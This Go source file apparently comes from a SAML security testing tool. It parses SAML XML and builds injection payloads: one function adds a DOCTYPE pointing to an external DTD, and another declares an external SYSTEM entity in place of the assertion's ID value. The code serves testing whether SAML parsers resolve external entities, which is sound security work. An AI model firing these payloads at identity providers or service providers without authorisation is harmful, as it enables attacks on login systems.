package xml_saml_security

import (
	"encoding/xml"
	stderrors "errors"
	"fmt"
	"io"
	"math/rand"
	"regexp"
	"strings"

	"github.com/pkg/errors"
)

// XMLDocument represents a parsed XML document.
type XMLDocument struct {
	Content    string
	HasDoctype bool
	IDAttrVal  string // Value of ID attribute if found
}

// ParseXML parses XML content and extracts metadata.
func ParseXML(content string) (*XMLDocument, error) {
	if !isXML(content) {
		return nil, errors.New("content does not start with '<'")
	}

	doc := &XMLDocument{
		Content:    content,
		HasDoctype: hasDoctype(content),
	}

	// Extract ID attribute value for ENTITY injection
	doc.IDAttrVal = extractIDAttribute(content)

	// Validate XML is parseable (basic check)
	decoder := xml.NewDecoder(strings.NewReader(content))
	for {
		_, err := decoder.Token()
		if stderrors.Is(err, io.EOF) {
			break
		}
		if err != nil {
			return nil, errors.Wrap(err, "invalid XML")
		}
	}

	return doc, nil
}

// hasDoctype checks if XML has an existing DOCTYPE declaration.
func hasDoctype(content string) bool {
	lower := strings.ToLower(content)
	return strings.Contains(lower, "<!doctype")
}

// extractIDAttribute finds the value of the first ID attribute in the XML.
// Used for ENTITY injection to reference the original ID value.
var idAttrRegex = regexp.MustCompile(`(?i)\bID\s*=\s*["']([^"']+)["']`)

func extractIDAttribute(content string) string {
	matches := idAttrRegex.FindStringSubmatch(content)
	if len(matches) > 1 {
		return matches[1]
	}
	return ""
}

// InjectDOCTYPE creates a payload with DOCTYPE injection.
func InjectDOCTYPE(doc *XMLDocument, decoded *DecodedSAML) (string, error) {
	if doc.HasDoctype {
		return "", errors.New("document already has DOCTYPE")
	}

	// Remove XML declaration if present
	content := removeXMLDeclaration(doc.Content)

	// Inject DOCTYPE before XML content
	payload := `<!DOCTYPE root SYSTEM "example.dtd">` + content

	return EncodeSAML(payload, decoded), nil
}

// InjectENTITY creates a payload with ENTITY injection.
func InjectENTITY(doc *XMLDocument, decoded *DecodedSAML) (string, error) {
	if doc.HasDoctype {
		return "", errors.New("document already has DOCTYPE")
	}

	if doc.IDAttrVal == "" {
		return "", errors.New("no ID attribute found for ENTITY injection")
	}

	// Remove XML declaration if present
	content := removeXMLDeclaration(doc.Content)

	// Replace ID value with entity reference
	placeholder := "PLACEHOLDER_UUID_" + randomString(8)
	modifiedContent := replaceIDValue(content, doc.IDAttrVal, placeholder)

	// Create DOCTYPE with ENTITY referencing original ID
	doctype := fmt.Sprintf(`<!DOCTYPE foo [ <!ENTITY uuid SYSTEM "%s"> ]>`, doc.IDAttrVal)

	// Build final payload
	payload := doctype + modifiedContent
	payload = strings.Replace(payload, placeholder, "&uuid;", 1)

	return EncodeSAML(payload, decoded), nil
}

// removeXMLDeclaration removes <?xml ... ?> declaration if present.
func removeXMLDeclaration(content string) string {
	if strings.HasPrefix(content, "<?xml") {
		idx := strings.Index(content, "?>")
		if idx != -1 {
			content = strings.TrimSpace(content[idx+2:])
		}
	}
	return content
}

// replaceIDValue replaces the ID attribute value in XML (case-insensitive to match extractIDAttribute).
func replaceIDValue(content, oldValue, newValue string) string {
	// Use case-insensitive regex to replace ID="oldValue" with ID="newValue"
	// Must match case-insensitivity of extractIDAttribute regex
	pattern := regexp.MustCompile(fmt.Sprintf(`(?i)(\bID\s*=\s*["'])%s(["'])`, regexp.QuoteMeta(oldValue)))
	return pattern.ReplaceAllString(content, "${1}"+newValue+"${2}")
}

func randomString(length int) string {
	const charset = "abcdefghijklmnopqrstuvwxyz0123456789"
	b := make([]byte, length)
	for i := range b {
		b[i] = charset[rand.Intn(len(charset))]
	}
	return string(b)
}
